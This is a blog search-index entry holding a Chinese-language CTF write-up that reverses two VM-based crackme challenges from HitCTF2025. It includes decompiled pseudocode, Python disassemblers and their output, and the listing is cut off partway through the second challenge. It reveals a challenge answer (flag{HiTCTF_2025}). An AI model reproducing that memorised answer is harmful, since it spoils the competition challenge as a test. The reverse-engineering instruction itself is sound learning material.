<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HitCTF2025-Reverse·VM</title>
      <link href="/2026/01/04/HitCTF2025-Reverse%C2%B7VM/"/>
      <url>/2026/01/04/HitCTF2025-Reverse%C2%B7VM/</url>
      
        <content type="html"><![CDATA[<h1 id="HitCTF2025-Reverse·VM"><a href="#HitCTF2025-Reverse·VM" class="headerlink" title="HitCTF2025-Reverse·VM"></a>HitCTF2025-Reverse·VM</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​说来也是搞笑，从接触 REVERSE 以来，并没有好好去学习或者复现过 vm 逆向，每次打比赛遇到了都选择直接 rm…</p><p>​昨天刚好看到 HitCTF2025 有两道 vm 逆向，遂学习记录一下。</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><h3 id="easyVM"><a href="#easyVM" class="headerlink" title="easyVM"></a>easyVM</h3><p>​附件中是一个 .exe 文件，ida 打开之后，main 函数第一行就是输出，然后可以看到 <strong>sub_7FF779ED1270</strong> 函数被调用两次，且分别传入不同的上下文结构体，那么基本可以确定 sub_7FF779ED1270 函数就是核心函数，即 VM Engine，跟进 sub_7FF779ED1270 函数进行分析。</p><p>​其中就是一个 switch-case 结构，根据分析可得到如下：</p><ul><li><p>首先看到<code>*(a1 + 1060)</code> 被频繁读&#x2F;写，而且每次取 opcode 后都 <code>+1</code>，那么就可以确定这是 指令指针（IP）；</p></li><li><p>然后是<code>*(a1 + 1072)</code>，参与<code>*(ip + base)</code>，可确定是字节码基址；</p></li><li><p><code>*(a1 + 1080)</code>：拿来跟 IP 比较，说明其是 code_end&#x2F;code_len；</p></li><li><p><code>*(a1 + 4*i)</code>：i 的范围检查是 <code>&lt;8</code>，可确定有八个寄存器，且每个为四字节；</p></li><li><p>在 case16 中可以看到 a1 + 1084 被 fgets 写入，可确定其是 输入缓冲；</p></li><li><p>在 case17 中可以看到 a1 + 1134 被 printf 输出，可确定其是 输出缓冲；</p></li><li><p>在 case14 中看到 根据<code>*(a1 + 1064)</code>的值进行判断然后跳转，逻辑即 jnz；</p></li><li><p><strong>sub_7FF779ED11E0</strong> 函数就是在更新标志位</p></li></ul><pre><code class="language-c">char __fastcall sub_7FF779ED11E0(__int64 a1, int a2, int a3, int a4)&#123;  char v4; // al  char v6; // al  char v7; // cl  char v8; // al  bool v9; // sf  char result; // al  v4 = *(a1 + 1064);  if ( a2 )                                     // ZF    v6 = v4 &amp; 0xFE;  else    v6 = v4 | 1;  *(a1 + 1064) = v6;  if ( a2 &gt;= 0 )                                // SF    v7 = v6 &amp; 0xFD;  else    v7 = v6 | 2;  *(a1 + 1064) = v7;  if ( a2 &gt;= a3 || a4 &lt;= 0 )                    // CF    v8 = v7 &amp; 0xFB;  else    v8 = v7 | 4;  *(a1 + 1064) = v8;  v9 = a3 &lt; 0;  if ( a3 &gt; 0 )                                 // OF  &#123;    if ( a4 &gt; 0 &amp;&amp; a2 &lt; 0 )      goto LABEL_18;    v9 = a3 &lt; 0;  &#125;  if ( v9 &amp;&amp; a4 &lt; 0 &amp;&amp; a2 &gt; 0 )  &#123;LABEL_18:    result = v8 | 8;    *(a1 + 1064) = result;    return result;  &#125;  result = v8 &amp; 0xF7;  *(a1 + 1064) = result;  return result;&#125;</code></pre><p>​然后根据上面的分析结构，对 a1 进行重定义，定义为 结构体。在 IDA 上方的菜单栏，依次点击 View -&gt; Open Subviews -&gt; Local types，然后右键点击 insert，贴入如下结构体的申明</p><pre><code class="language-c">struct VMState&#123;  int regs[8];  char _pad0[1028];  int ip;  int flags;  char _pad1[4];  unsigned __int8 *code;  int code_end;  char inbuf[50];  char outbuf[128];&#125;;</code></pre><p>​接着结合分析，可清楚各操作数所对应的操作</p><pre><code class="language-c">__int64 __fastcall sub_7FF779ED1270(struct VMState *vm)&#123;  __int64 ip; // rdx  unsigned __int8 *code; // r8  int opcode; // ecx  int v5; // edx  int v6; // ecx  unsigned __int8 n0x80; // r9  char v8; // dl  int v9; // ecx  unsigned __int8 n8; // r9  unsigned __int8 n0x32; // dl  int v12; // ecx  unsigned __int8 n8_1; // r9  unsigned __int8 n8_2; // dl  int v15; // ecx  __int64 n8_3; // r9  int v17; // edx  int v18; // ecx  unsigned __int8 n8_4; // r9  unsigned __int8 n8_5; // dl  int v21; // r8d  int *v22; // rcx  int v23; // r9d  __int64 n8_6; // r10  int v25; // r9d  int v26; // r8d  int v27; // ecx  unsigned __int8 n8_7; // r9  unsigned __int8 n8_8; // dl  int v30; // r8d  int *v31; // rcx  int v32; // r9d  __int64 n8_9; // r10  int v34; // r9d  int v35; // r8d  unsigned __int8 n8_10; // r10  unsigned __int8 n8_11; // r9  int *v38; // rdx  int v39; // ecx  __int64 n8_12; // r9  int v41; // edx  int v42; // ecx  unsigned __int8 n8_13; // r9  unsigned __int8 n8_14; // dl  __int64 n8_15; // r9  int v46; // r10d  bool v47; // zf  int v48; // ecx  FILE *v49; // rax  __int64 v50; // rax  if ( vm-&gt;ip &lt; vm-&gt;code_end )  &#123;    while ( 2 )    &#123;      ip = vm-&gt;ip;      code = vm-&gt;code;      opcode = code[ip];      v5 = ip + 1;      vm-&gt;ip = v5;      switch ( opcode )      &#123;        case 0:          return 0i64;        case 1:                                 // MOVImm2outBuf          v6 = v5 + 1;          n0x80 = code[v5];          vm-&gt;ip = v5 + 1;          v8 = code[v5 + 1];          vm-&gt;ip = v6 + 1;          if ( n0x80 &gt;= 0x80u )            return 0xFFFFFFFFi64;          vm-&gt;outbuf[n0x80] = v8;          goto LABEL_42;        case 2:                                 // MOVinBuf2Reg          v9 = v5 + 1;          n8 = code[v5];          vm-&gt;ip = v5 + 1;          n0x32 = code[v5 + 1];          vm-&gt;ip = v9 + 1;          if ( n0x32 &gt;= 0x32u || n8 &gt;= 8u )            return 0xFFFFFFFFi64;          vm-&gt;regs[n8] = vm-&gt;inbuf[n0x32];          goto LABEL_42;        case 3:                                 // MOVReg2Reg          v12 = v5 + 1;          n8_1 = code[v5];          vm-&gt;ip = v5 + 1;          n8_2 = code[v5 + 1];          vm-&gt;ip = v12 + 1;          if ( n8_1 &gt;= 8u || n8_2 &gt;= 8u )            return 0xFFFFFFFFi64;          vm-&gt;regs[n8_1] = vm-&gt;regs[n8_2];          goto LABEL_42;        case 4:                                 // MOVImm2Reg          v15 = v5 + 1;          n8_3 = code[v5];          vm-&gt;ip = v5 + 1;          v17 = code[v5 + 1];          vm-&gt;ip = v15 + 1;          if ( n8_3 &gt;= 8 )            return 0xFFFFFFFFi64;          vm-&gt;regs[n8_3] = v17;          goto LABEL_42;        case 5:                                 // ADDReg&amp;Reg          v18 = v5 + 1;          n8_4 = code[v5];          vm-&gt;ip = v5 + 1;          n8_5 = code[v5 + 1];          vm-&gt;ip = v18 + 1;          if ( n8_4 &gt;= 8u || n8_5 &gt;= 8u )            return 0xFFFFFFFFi64;          v21 = vm-&gt;regs[n8_4];          v22 = &amp;vm-&gt;regs[n8_4];          v23 = vm-&gt;regs[n8_5];          *v22 = v23 + v21;          sub_7FF779ED11E0(vm, v23 + v21, v21, v23);          goto LABEL_42;        case 6:                                 // ADDReg&amp;Imm          n8_6 = code[v5];          vm-&gt;ip = v5 + 1;          v25 = code[v5 + 1];          vm-&gt;ip = v5 + 2;          if ( n8_6 &gt;= 8 )            return 0xFFFFFFFFi64;          v26 = vm-&gt;regs[n8_6];          vm-&gt;regs[n8_6] = v26 + v25;          sub_7FF779ED11E0(vm, v26 + v25, v26, v25);          goto LABEL_42;        case 7:                                 // SUBReg&amp;Reg          v27 = v5 + 1;          n8_7 = code[v5];          vm-&gt;ip = v5 + 1;          n8_8 = code[v5 + 1];          vm-&gt;ip = v27 + 1;          if ( n8_7 &gt;= 8u || n8_8 &gt;= 8u )            return 0xFFFFFFFFi64;          v30 = vm-&gt;regs[n8_7];          v31 = &amp;vm-&gt;regs[n8_7];          v32 = vm-&gt;regs[n8_8];          *v31 = v30 - v32;          sub_7FF779ED11E0(vm, v30 - v32, v30, -v32);          goto LABEL_42;        case 8:                                 // SUBReg&amp;Imm          n8_9 = code[v5];          vm-&gt;ip = v5 + 1;          v34 = code[v5 + 1];          vm-&gt;ip = v5 + 2;          if ( n8_9 &gt;= 8 )            return 0xFFFFFFFFi64;          v35 = vm-&gt;regs[n8_9];          vm-&gt;regs[n8_9] = v35 - v34;          sub_7FF779ED11E0(vm, v35 - v34, v35, -v34);          goto LABEL_42;        case 9:                                 // XORReg&amp;Reg          n8_10 = code[v5];          vm-&gt;ip = v5 + 1;          n8_11 = code[v5 + 1];          vm-&gt;ip = v5 + 2;          if ( n8_10 &gt;= 8u || n8_11 &gt;= 8u )            return 0xFFFFFFFFi64;          v38 = &amp;vm-&gt;regs[n8_10];          *v38 ^= vm-&gt;regs[n8_11];          sub_7FF779ED11E0(vm, *v38, 0, 0);          goto LABEL_42;        case 10:                                // XORReg&amp;Imm          v39 = v5 + 1;          n8_12 = code[v5];          vm-&gt;ip = v5 + 1;          v41 = code[v5 + 1];          vm-&gt;ip = v39 + 1;          if ( n8_12 &gt;= 8 )            return 0xFFFFFFFFi64;          vm-&gt;regs[n8_12] ^= v41;          sub_7FF779ED11E0(vm, vm-&gt;regs[n8_12], 0, 0);          goto LABEL_42;        case 11:                                // CMPReg&amp;Reg          v42 = v5 + 1;          n8_13 = code[v5];          vm-&gt;ip = v5 + 1;          n8_14 = code[v5 + 1];          vm-&gt;ip = v42 + 1;          if ( n8_13 &gt;= 8u || n8_14 &gt;= 8u )            return 0xFFFFFFFFi64;          sub_7FF779ED11E0(vm, vm-&gt;regs[n8_13] - vm-&gt;regs[n8_14], vm-&gt;regs[n8_13], -vm-&gt;regs[n8_14]);          goto LABEL_42;        case 12:                                // CMPReg&amp;Imm          n8_15 = code[v5];          vm-&gt;ip = v5 + 1;          v46 = code[v5 + 1];          vm-&gt;ip = v5 + 2;          if ( n8_15 &gt;= 8 )            return 0xFFFFFFFFi64;          sub_7FF779ED11E0(vm, vm-&gt;regs[n8_15] - v46, vm-&gt;regs[n8_15], -v46);LABEL_42:          if ( vm-&gt;ip &gt;= vm-&gt;code_end )            return 0i64;          continue;        case 13:                                // JMP          vm-&gt;ip = code[v5];          goto LABEL_42;        case 14:                                // JNZ          v47 = (vm-&gt;flags &amp; 1) == 0;          v48 = code[v5];          vm-&gt;ip = v5 + 1;          if ( v47 )            vm-&gt;ip = v48;          goto LABEL_42;        case 16:                                // READ          v49 = _acrt_iob_func(0);          common_fgets&lt;char&gt;(vm-&gt;inbuf, 50i64, v49);          v50 = -1i64;          do            ++v50;          while ( vm-&gt;inbuf[v50] );          if ( v50 &amp;&amp; *(&amp;vm-&gt;code_end + v50 + 3) == 10 )            *(&amp;vm-&gt;code_end + v50 + 3) = 0;          goto LABEL_42;        case 17:                                // PRINT          printf(&quot;%s&quot;, vm-&gt;outbuf);          goto LABEL_42;        default:          return 0xFFFFFFFFi64;      &#125;    &#125;  &#125;  return 0i64;&#125;</code></pre><p>​然后编写脚本把汇编进行输出</p><pre><code class="language-python">OPLEN = &#123;    0x00: 1, 0x01: 3, 0x02: 3, 0x03: 3, 0x04: 3,    0x05: 3, 0x06: 3, 0x07: 3, 0x08: 3, 0x09: 3,    0x0A: 3, 0x0B: 3, 0x0C: 3, 0x0D: 2, 0x0E: 2,    0x10: 1, 0x11: 1,&#125;def parse_hex(s: str) -&gt; bytes:    s = s.replace(&quot;\n&quot;, &quot; &quot;).replace(&quot;\t&quot;, &quot; &quot;).strip()    return bytes(int(x, 16) for x in s.split() if x)def disasm(code: bytes) -&gt; None:    ip = 0    while ip &lt; len(code):        op = code[ip]        ln = OPLEN.get(op, 1)        ins = code[ip:ip+ln]        if op not in OPLEN:            print(f&quot;&#123;ip:04x&#125;: db &#123;op:02x&#125;&quot;)            ip += 1            continue        def b(i): return ins[i]        if op == 0x00: print(f&quot;&#123;ip:04x&#125;: HALT&quot;)        elif op == 0x01: print(f&quot;&#123;ip:04x&#125;: PUTC out[&#123;b(1)&#125;] = &#123;b(2):02x&#125; (&#39;&#123;chr(b(2))&#125;&#39;)&quot;)        elif op == 0x02: print(f&quot;&#123;ip:04x&#125;: LOAD R&#123;b(1)&#125;, in[&#123;b(2)&#125;]&quot;)        elif op == 0x03: print(f&quot;&#123;ip:04x&#125;: MOV  R&#123;b(1)&#125;, R&#123;b(2)&#125;&quot;)        elif op == 0x04: print(f&quot;&#123;ip:04x&#125;: MOVI R&#123;b(1)&#125;, &#123;b(2)&#125;&quot;)        elif op == 0x05: print(f&quot;&#123;ip:04x&#125;: ADD  R&#123;b(1)&#125;, R&#123;b(2)&#125;&quot;)        elif op == 0x06: print(f&quot;&#123;ip:04x&#125;: ADDI R&#123;b(1)&#125;, &#123;b(2)&#125;&quot;)        elif op == 0x07: print(f&quot;&#123;ip:04x&#125;: SUB  R&#123;b(1)&#125;, R&#123;b(2)&#125;&quot;)        elif op == 0x08: print(f&quot;&#123;ip:04x&#125;: SUBI R&#123;b(1)&#125;, &#123;b(2)&#125;&quot;)        elif op == 0x09: print(f&quot;&#123;ip:04x&#125;: XOR  R&#123;b(1)&#125;, R&#123;b(2)&#125;&quot;)        elif op == 0x0A: print(f&quot;&#123;ip:04x&#125;: XORI R&#123;b(1)&#125;, &#123;b(2)&#125;&quot;)        elif op == 0x0B: print(f&quot;&#123;ip:04x&#125;: CMP  R&#123;b(1)&#125;, R&#123;b(2)&#125;&quot;)        elif op == 0x0C: print(f&quot;&#123;ip:04x&#125;: CMPI R&#123;b(1)&#125;, &#123;b(2)&#125;&quot;)        elif op == 0x0D: print(f&quot;&#123;ip:04x&#125;: JMP  &#123;b(1):02x&#125;&quot;)        elif op == 0x0E: print(f&quot;&#123;ip:04x&#125;: JNZ  &#123;b(1):02x&#125;&quot;)        elif op == 0x10: print(f&quot;&#123;ip:04x&#125;: READ&quot;)        elif op == 0x11: print(f&quot;&#123;ip:04x&#125;: PRINT&quot;)        ip += lnif __name__ == &quot;__main__&quot;:    HEX = &quot;&quot;&quot;    0D 3C 01 06 0A 01 02 6F 01 00     57 01 05 21 01 03 6E 01 01 72     01 04 67 01 07 00 11 00 01 04     65 01 05 63 01 09 00 01 01 6F     01 03 72 01 07 21 01 02 72 01     08 0A 01 00 43 01 06 74 11 00     10 02 00 00 0C 00 66 0E 02 02     00 01 03 01 00 06 01 01 0C 01     6D 0E 02 02 01 02 02 02 03 02     03 04 03 00 01 09 00 02 0C 00     06 0E 02 03 00 02 09 00 03 0C     00 1C 0E 02 03 00 01 09 00 03     0C 00 1A 0E 02 02 01 05 02 02     06 02 03 07 0C 02 69 0E 02 03     00 01 09 00 02 0C 00 21 0E 02     03 00 03 09 00 02 0C 00 3D 0E     02 02 04 08 02 05 09 02 06 0A     0B 05 03 0E 02 03 00 04 09 00     05 0C 00 17 0E 02 03 00 06 09     00 05 0C 00 12 0E 02 02 01 0B     02 02 0C 02 03 0D 02 04 0E 02     05 0F 02 06 10 02 07 11 0B 02     04 0E 02 03 00 01 05 00 00 0C     00 BE 0E 02 09 00 00 0B 00 07     0E 02 05 00 02 0C 00 32 0E 02     08 00 02 0C 00 30 0E 02 06 00     05 0B 00 05 0E 02 02 00 04 07     06 00 0C 06 02 0E 02 0D 1C 00    &quot;&quot;&quot;    code = parse_hex(HEX)    disasm(code)</code></pre><p>​得到输出</p><pre><code class="language-shell">0000: JMP  3c0002: PUTC out[6] = 0a (&#39;&#39;)0005: PUTC out[2] = 6f (&#39;o&#39;)0008: PUTC out[0] = 57 (&#39;W&#39;)000b: PUTC out[5] = 21 (&#39;!&#39;)000e: PUTC out[3] = 6e (&#39;n&#39;)0011: PUTC out[1] = 72 (&#39;r&#39;)0014: PUTC out[4] = 67 (&#39;g&#39;)0017: PUTC out[7] = 00 (&#39; &#39;)001a: PRINT001b: HALT001c: PUTC out[4] = 65 (&#39;e&#39;)001f: PUTC out[5] = 63 (&#39;c&#39;)0022: PUTC out[9] = 00 (&#39; &#39;)0025: PUTC out[1] = 6f (&#39;o&#39;)0028: PUTC out[3] = 72 (&#39;r&#39;)002b: PUTC out[7] = 21 (&#39;!&#39;)002e: PUTC out[2] = 72 (&#39;r&#39;)0031: PUTC out[8] = 0a (&#39;&#39;)0034: PUTC out[0] = 43 (&#39;C&#39;)0037: PUTC out[6] = 74 (&#39;t&#39;)003a: PRINT003b: HALT003c: READ003d: LOAD R0, in[0]0040: CMPI R0, 1020043: JNZ  020045: LOAD R0, in[1]0048: MOV  R1, R0004b: ADDI R1, 1004e: CMPI R1, 1090051: JNZ  020053: LOAD R1, in[2]0056: LOAD R2, in[3]0059: LOAD R3, in[4]005c: MOV  R0, R1005f: XOR  R0, R20062: CMPI R0, 60065: JNZ  020067: MOV  R0, R2006a: XOR  R0, R3006d: CMPI R0, 280070: JNZ  020072: MOV  R0, R10075: XOR  R0, R30078: CMPI R0, 26007b: JNZ  02007d: LOAD R1, in[5]0080: LOAD R2, in[6]0083: LOAD R3, in[7]0086: CMPI R2, 1050089: JNZ  02008b: MOV  R0, R1008e: XOR  R0, R20091: CMPI R0, 330094: JNZ  020096: MOV  R0, R30099: XOR  R0, R2009c: CMPI R0, 61009f: JNZ  0200a1: LOAD R4, in[8]00a4: LOAD R5, in[9]00a7: LOAD R6, in[10]00aa: CMP  R5, R300ad: JNZ  0200af: MOV  R0, R400b2: XOR  R0, R500b5: CMPI R0, 2300b8: JNZ  0200ba: MOV  R0, R600bd: XOR  R0, R500c0: CMPI R0, 1800c3: JNZ  0200c5: LOAD R1, in[11]00c8: LOAD R2, in[12]00cb: LOAD R3, in[13]00ce: LOAD R4, in[14]00d1: LOAD R5, in[15]00d4: LOAD R6, in[16]00d7: LOAD R7, in[17]00da: CMP  R2, R400dd: JNZ  0200df: MOV  R0, R100e2: ADD  R0, R000e5: CMPI R0, 19000e8: JNZ  0200ea: XOR  R0, R000ed: CMP  R0, R700f0: JNZ  0200f2: ADD  R0, R200f5: CMPI R0, 5000f8: JNZ  0200fa: SUBI R0, 200fd: CMPI R0, 480100: JNZ  020102: ADDI R0, 50105: CMP  R0, R50108: JNZ  02010a: LOAD R0, in[4]010d: SUB  R6, R00110: CMPI R6, 20113: JNZ  020115: JMP  1c0117: HALT</code></pre><p>​就是一些简单的约束，这里就不赘述怎么求解了，最终 flag 就是 flag{HiTCTF_2025}</p><hr><h3 id="ComplexVM"><a href="#ComplexVM" class="headerlink" title="ComplexVM"></a>ComplexVM</h3><p>​这道 vm 比上一道要复杂一些。main 函数的开头部分申明了一个很大的 buffer（v33），明显被当成 VM COntext &#x2F; 寄存器块 + 字节码区 使用。接着初始化一些变量。然后 <strong>sub_140001210</strong> 函数就是解释器。</p><p>​while 循环 1024 个 opcode，其中 <strong>sub_140004090</strong> 函数一直跟下去是反调试的逻辑。第一个 while 循环就是输出 <code>Input your flag:</code> 的。</p><p>​第二段就很重要了。构造了另一个 VM 上下文 <code>v36 + v40</code>。跟进 <strong>sub_1400048C0</strong> 函数可以看到有一个 fake flag。</p><pre><code class="language-c">__int64 __fastcall sub_1400048C0(_BYTE *a1)&#123;  int n0x11; // r9d  unsigned __int8 *i; // r8  int v3; // edx  int v4; // edx  __int64 n0x11_1; // rax  char flag_HITCTF_fake__[24]; // [rsp+0h] [rbp-28h] BYREF  n0x11 = 0;  strcpy(flag_HITCTF_fake__, &quot;flag&#123;HITCTF_fake&#125;&quot;);  for ( i = a1 + 1052; ; ++i )  &#123;    v3 = i[flag_HITCTF_fake__ - a1 - 1052];    a1[8] = v3;    v4 = v3 - 1;    n0x11_1 = *i;    a1[9] = n0x11_1;    if ( v4 )      a1[16] &amp;= ~1u;    else      a1[16] |= 1u;    if ( (v4 &amp; 0x80u) == 0 )      a1[16] &amp;= ~4u;    else      a1[16] |= 4u;    if ( v4 &gt;= 0 )      a1[16] &amp;= ~2u;    else      a1[16] |= 2u;    if ( (a1[16] &amp; 1) == 0 )      break;    ++n0x11;    a1[15] = -86;    n0x11_1 = n0x11;    if ( n0x11 &gt;= 0x11 )      return n0x11_1;  &#125;  a1[15] = -1;  return n0x11_1;&#125;</code></pre><p>​并且根据伪代码可知该函数是从 a1 + 1052 开始循环的，同时再看 v36 和 v40 之间的相对偏移</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20260104144037928.png" alt="image-20260104144037928"></p><p>​差了 0x1C（28）字节，即 a1 + 1052 正好落在 v40 + 1024 这个位置。故可知 sub_1400048C0 函数就是一个假验证逻辑：拿 flag{HITCTF_fake} 去对比 数据区开头（v40 + 1024），而此时 <strong>memset(v40,0,sizeof(v40))</strong> 刚清零，所以比较肯定失败。接下来进入解释器分析。</p><p>​该 vm 的布局如下：</p><ul><li>a1 + 20：指令指针 IP；</li><li>a1 + 16：标志寄存器 Flags（Z&#x2F;N&#x2F;C）；</li><li>a1 + 8：寄存器文件 regs[]；</li><li>a1 + 28：字节码&#x2F;内存池men[]。它即被 IP 当作“取指&#x2F;取操作数”的来源，也被当做栈或者中间存储写入；</li><li>a1 + 24：栈指针&#x2F;栈深 SP。反复出现 <code>if (*(a1+24) &gt;= 0x3FF</code>；</li><li>a1 + 1052 &#x2F; a1 + 1180：输入缓冲区 &amp; 输出缓冲区。</li></ul><p>​然后根据分析的布局，申明一个结构体</p><pre><code class="language-c">typedef struct VMCTX&#123;  void **dispatch;        // 0x00: off_14001DCF8 这类 handler 表指针  // 0x08..0x0F: 8个“虚拟寄存器/槽位”  // 你看到的 a1[8], a1[9], a1[15] 都落在这里：reg[0]=a1[8], reg[1]=a1[9], ..., reg[7]=a1[15]  unsigned __int8 reg[8]; // 0x08  unsigned int flags;     // 0x10: a1[16] 实际就是 flags 的低字节 (ZF/CF/SF 等)  unsigned int ip;        // 0x14: *(a1+20) 作为 operand 读取/跳转用的 IP  unsigned int sp;        // 0x18: *(a1+24) 栈指针/深度（上限 0x3FF）  unsigned __int8 mem[0x400];  // 0x1C: v40[0..1023] 字节码/内存区（你外层循环就是从这里取 opcode）  char input[0x80];            // 0x41C: a1+1052，fgets 读入，case 31 从这里取字符  char output[0x80];           // 0x49C: a1+1180，case 32 写入，case 29/30 printf 输出&#125; VMCTX;</code></pre><p>​可以看到在 switch-case 的后半部分全是特殊的赋值情况，其中一个例子如下。即取一个立即数，然后进行加&#x2F;减一个数，再进行赋值。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20260104153727876.png" alt="image-20260104153727876"></p><p>​然后前半部分就是一些常见的运算赋值等操作。然后就可以使用脚本进行输出汇编操作了</p><pre><code class="language-python">import sysimport argparseimport re# operand kindsR   = &quot;R&quot;     # 1 byte register indexI8  = &quot;I8&quot;    # 1 byte immediateA16 = &quot;A16&quot;   # 2 byte address (big-endian)# Base opcode table (你已经验证的一批)OPS = &#123;    0x00: (&quot;NOP&quot;,  []),    0x01: (&quot;MOV&quot;,  [R, R]),    0x02: (&quot;ADD&quot;,  [R, R]),    0x03: (&quot;SUB&quot;,  [R, R]),    0x04: (&quot;AND&quot;,  [R, R]),    0x05: (&quot;OR&quot;,   [R, R]),    0x06: (&quot;XOR&quot;,  [R, R]),    0x07: (&quot;MOVI&quot;, [R, I8]),    0x08: (&quot;ADDI&quot;, [R, I8]),    0x09: (&quot;SUBI&quot;, [R, I8]),    0x0A: (&quot;ANDI&quot;, [R, I8]),    0x0B: (&quot;ORI&quot;,  [R, I8]),    0x0C: (&quot;XORI&quot;, [R, I8]),    0x0D: (&quot;NOT&quot;,  [R]),    0x0E: (&quot;SHL1&quot;, [R]),    0x0F: (&quot;SHR1&quot;, [R]),    0x10: (&quot;JMP&quot;,  [A16]),    0x11: (&quot;JZ&quot;,   [A16]),    0x12: (&quot;JNZ&quot;,  [A16]),    0x13: (&quot;CALL&quot;, [A16]),    0x14: (&quot;RET&quot;,  []),    0x15: (&quot;PUSH&quot;, [R]),    0x16: (&quot;POP&quot;,  [R]),    0x17: (&quot;CMP&quot;,  [R, R]),    0x18: (&quot;CMPI&quot;, [R, I8]),    0x19: (&quot;INC&quot;,  [R]),    0x1A: (&quot;DEC&quot;,  [R]),    0x1B: (&quot;DAA&quot;,  []),    0x1C: (&quot;READ&quot;, []),    0x1D: (&quot;PRINT&quot;, []),    0x1E: (&quot;PRINT2&quot;, []),    0x1F: (&quot;LDI_IN&quot;,  [R, I8]),   # r = input[idx]    0x20: (&quot;STO_OUT&quot;, [I8, R]),   # output[idx] = r&#125;# 你贴出来的 0x21~0x25：格式都是 [opcode][dst][imm]，语义 reg[dst] = imm + adj# case 0x21: imm - 54# case 0x22: imm - 112# case 0x23: imm + 68# case 0x24: imm + 57# case 0x25: imm + 78LDC_ADJ = &#123;    0x21: -54,    0x22: -112,    0x23: +68,    0x24: +57,    0x25: +78,&#125;def u16be(b0, b1):    return ((b0 &amp; 0xFF) &lt;&lt; 8) | (b1 &amp; 0xFF)def is_printable(x):    return 0x20 &lt;= x &lt;= 0x7Edef decode_one(code, pc, guess_ldc=False):    &quot;&quot;&quot;    返回 (next_pc, asm_line, jump_target_or_None)    &quot;&quot;&quot;    n = len(code)    if pc &gt;= n:        return pc + 1, &quot;%04X: &lt;eof&gt;&quot; % pc, None    op = code[pc]    # LDC 变体：固定 3 字节    if op in LDC_ADJ:        if pc + 3 &gt; n:            raw = &quot; &quot;.join(&quot;%02X&quot; % b for b in code[pc:])            return n, &quot;%04X: %s  ; truncated&quot; % (pc, raw), None        dst = code[pc+1]        imm = code[pc+2]        adj = LDC_ADJ[op]        val = (imm + adj) &amp; 0xFF        ch = &quot; &#39;%s&#39;&quot; % chr(val) if is_printable(val) else &quot;&quot;        raw = &quot;%02X %02X %02X&quot; % (op, dst, imm)        sign = &quot;+&quot; if adj &gt;= 0 else &quot;-&quot;        line = &quot;%04X: %-11s LDC     r%d, 0x%02X%s   ; imm=0x%02X %s %d&quot; % (            pc, raw, dst, val, ch, imm, sign, abs(adj)        )        return pc + 3, line, None    # 如果启用 guess_ldc：未知但在 0x21..0xFE 也按 3 字节吃掉，避免失步（可选）    if guess_ldc and (0x21 &lt;= op &lt;= 0xFE) and (op not in OPS):        if pc + 3 &gt; n:            raw = &quot; &quot;.join(&quot;%02X&quot; % b for b in code[pc:])            return n, &quot;%04X: %s  ; truncated&quot; % (pc, raw), None        dst = code[pc+1]        imm = code[pc+2]        raw = &quot;%02X %02X %02X&quot; % (op, dst, imm)        line = &quot;%04X: %-11s OP%02X   r%d, 0x%02X&quot; % (pc, raw, op, dst, imm)        return pc + 3, line, None    # 普通表驱动    if op not in OPS:        raw = &quot;%02X&quot; % op        return pc + 1, &quot;%04X: %-11s DB      0x%02X   ; unknown&quot; % (pc, raw, op), None    mnem, kinds = OPS[op]    # 计算指令长度    need = 1    for k in kinds:        need += 2 if k == A16 else 1    if pc + need &gt; n:        raw = &quot; &quot;.join(&quot;%02X&quot; % b for b in code[pc:])        return n, &quot;%04X: %s  ; truncated&quot; % (pc, raw), None    raw_bytes = code[pc:pc+need]    raw = &quot; &quot;.join(&quot;%02X&quot; % b for b in raw_bytes)    # 读操作数    i = pc + 1    ops_txt = []    jmp_tgt = None    for k in kinds:        if k == A16:            tgt = u16be(code[i], code[i+1])            ops_txt.append(&quot;loc_%04X&quot; % tgt)            jmp_tgt = tgt            i += 2        elif k == R:            r = code[i]            ops_txt.append(&quot;r%d&quot; % r)            i += 1        else:  # I8            imm = code[i]            ops_txt.append(&quot;0x%02X&quot; % imm)            i += 1    if ops_txt:        line = &quot;%04X: %-11s %-7s %s&quot; % (pc, raw, mnem, &quot;, &quot;.join(ops_txt))    else:        line = &quot;%04X: %-11s %s&quot; % (pc, raw, mnem)    return pc + need, line, jmp_tgtdef disasm(code, labels=False, guess_ldc=False):    # pass1: 收集跳转目标（可选）    targets = set()    if labels:        pc = 0        while pc &lt; len(code):            npc, line, tgt = decode_one(code, pc, guess_ldc=guess_ldc)            if tgt is not None:                targets.add(tgt)            if npc &lt;= pc:                break            pc = npc    # pass2: 输出    pc = 0    while pc &lt; len(code):        if labels and pc in targets:            print(&quot;loc_%04X:&quot; % pc)        npc, line, tgt = decode_one(code, pc, guess_ldc=guess_ldc)        print(line)        if npc &lt;= pc:            break        pc = npcdef read_hex_stream(text):    # 允许空格/换行    parts = text.strip().split()    if not parts:        return b&quot;&quot;    return bytes(int(x, 16) for x in parts)def main():    ap = argparse.ArgumentParser()    ap.add_argument(&quot;--hexfile&quot;, help=&quot;hex bytes file (e.g. code.hex). If omitted, read from stdin.&quot;)    ap.add_argument(&quot;--labels&quot;, action=&quot;store_true&quot;, help=&quot;print labels for jump targets&quot;)    ap.add_argument(&quot;--guess-ldc&quot;, action=&quot;store_true&quot;,                    help=&quot;treat unknown opcodes in 0x21..0xFE as 3-byte (opcode,dst,imm) to avoid desync&quot;)    args = ap.parse_args()    if args.hexfile:        text = open(args.hexfile, &quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;).read()    else:        text = sys.stdin.read()    code = read_hex_stream(text)    if not code:        print(&quot;No input bytes. Usage: python vm_disasm.py --hexfile code.hex&quot;)        return    disasm(code, labels=args.labels, guess_ldc=args.guess_ldc)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>​拿到输出</p><pre><code class="language-shell">0000: 13 00 75    CALL    loc_00750003: 06 05 05    XOR     r5, r50006: 07 01 72    MOVI    r1, 0x720009: 07 03 6E    MOVI    r3, 0x6E000C: 07 02 6F    MOVI    r2, 0x6F000F: 07 04 67    MOVI    r4, 0x670012: 07 00 57    MOVI    r0, 0x570015: 20 00 00    STO_OUT 0x00, r00018: 20 04 04    STO_OUT 0x04, r4001B: 20 02 02    STO_OUT 0x02, r2001E: 20 03 03    STO_OUT 0x03, 